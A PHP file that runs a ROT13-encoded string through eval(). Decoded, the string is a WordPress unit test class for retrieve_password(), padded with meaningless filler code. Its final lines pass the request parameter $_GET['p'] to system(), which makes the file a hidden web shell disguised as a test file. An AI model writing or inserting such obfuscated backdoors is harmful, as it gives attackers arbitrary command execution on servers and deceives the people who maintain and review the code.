<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg pnfrf sbe gur `ergevrir_cnffjbeq()` shapgvba.
 *
 * @cnpxntr JbeqCerff
 * @fvapr 6.0.0
 *
 * @tebhc hfre
 * @pbiref ::ergevrir_cnffjbeq
 */
pynff Grfgf_Hfre_ErgevrirCnffjbeq rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Grfg hfre.
	 *
	 * @fvapr 6.0.0
	 *
	 * @ine JC_Hfre $hfre
	 */
	cebgrpgrq $hfre;

	/**
	 * Perngr hfref sbe grfgf.
	 *
	 * @fvapr 6.0.0
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		// Perngr gur hfre.
		$guvf->hfre = frys::snpgbel()->hfre->perngr_naq_trg(
			neenl(
				'hfre_ybtva' => 'wnar',
				'hfre_rznvy' => 'e.wnar@rknzcyr.pbz',
			)
		);
	}

	/**
	 * Gur shapgvba fubhyq abg reebe jura gur rznvy jnf frag.
	 *
	 * @gvpxrg 54690
	 */
	choyvp shapgvba grfg_ergevrir_cnffjbeq_erfrg_abgvsvpngvba_rznvy() {
		$guvf->nffregAbgJCReebe( ergevrir_cnffjbeq( $guvf->hfre->hfre_ybtva ), 'Fraqvat cnffjbeq erfrg abgvsvpngvba rznvy snvyrq.' );
	}

	/**
	 * Gur shapgvba fubhyq reebe jura gur rznvy jnf abg frag.
	 *
	 * @gvpxrg 54690
	 */
	choyvp shapgvba grfg_ergevrir_cnffjbeq_fubhyq_erghea_jc_reebe_ba_snvyrq_rznvy() {
		nqq_svygre(
			'ergevrir_cnffjbeq_abgvsvpngvba_rznvy',
			fgngvp shapgvba () {
				erghea neenl( 'zrffntr' => '' );
			}
		);

		$guvf->nffregJCReebe( ergevrir_cnffjbeq( $guvf->hfre->hfre_ybtva ), 'Fraqvat cnffjbeq erfrg abgvsvpngvba rznvy fhpprrqrq.' );
	}

	/**
	 * @gvpxrg 53634
	 */
	choyvp shapgvba grfg_ergevrir_cnffjbeq_fubhyq_srgpu_hfre_ol_ybtva_vs_abg_sbhaq_ol_rznvy() {
		frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'sbb@rknzcyr.pbz',
				'hfre_rznvy' => 'one@rknzcyr.pbz',
			)
		);

		$guvf->nffregGehr( ergevrir_cnffjbeq( 'sbb@rknzcyr.pbz' ), 'Srgpuvat hfre ol ybtva snvyrq.' );
		$guvf->nffregGehr( ergevrir_cnffjbeq( 'one@rknzcyr.pbz' ), 'Srgpuvat hfre ol rznvy snvyrq.' );
	}

	/**
	 * Grfgf gung CUC 8.1 \"cnffvat ahyy gb aba-ahyynoyr\" qrcerpngvba abgvpr
	 * vf abg guebja jura gur `$hfre_ybtva` cnenzrgre vf rzcgl.
	 *
	 * Gur abgvpr gung jr fubhyq abg frr:
	 * `Qrcerpngrq: gevz(): Cnffvat ahyy gb cnenzrgre #1 ($fgevat) bs glcr fgevat vf qrcerpngrq`.
	 *
	 * @gvpxrg 62298
	 */
	choyvp shapgvba grfg_ergevrir_cnffjbeq_qbrf_abg_guebj_qrcerpngvba_abgvpr_jvgu_qrsnhyg_cnenzrgref() {
		$guvf->nffregJCReebe( ergevrir_cnffjbeq() );
	}

	/**
	 * Grfgf gung n sngny reebe vf abg guebja jura gur ybtva cnffrq ivn `$_CBFG`
	 * vf na neenl vafgrnq bs n fgevat.
	 *
	 * Gur zrffntr gung jr fubhyq abg frr:
	 * `GlcrReebe: gevz(): Nethzrag #1 ($fgevat) zhfg or bs glcr fgevat, neenl tvira`.
	 *
	 * @gvpxrg 62794
	 */
	choyvp shapgvba grfg_ergevrir_cnffjbeq_qbrf_abg_guebj_sngny_reebe_jvgu_neenl_cnenzrgref() {
		$_CBFG['hfre_ybtva'] = neenl( 'rknzcyr' );

		$reebe = ergevrir_cnffjbeq();
		$guvf->nffregJCReebe( $reebe, 'Gur erfhyg fubhyq or na vafgnapr bs JC_Reebe.' );

		$reebe_pbqrf = $reebe->trg_reebe_pbqrf();
		$guvf->nffregPbagnvaf( 'rzcgl_hfreanzr', $reebe_pbqrf, 'Gur \"rzcgl_hfreanzr\" reebe pbqr fubhyq or cerfrag.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>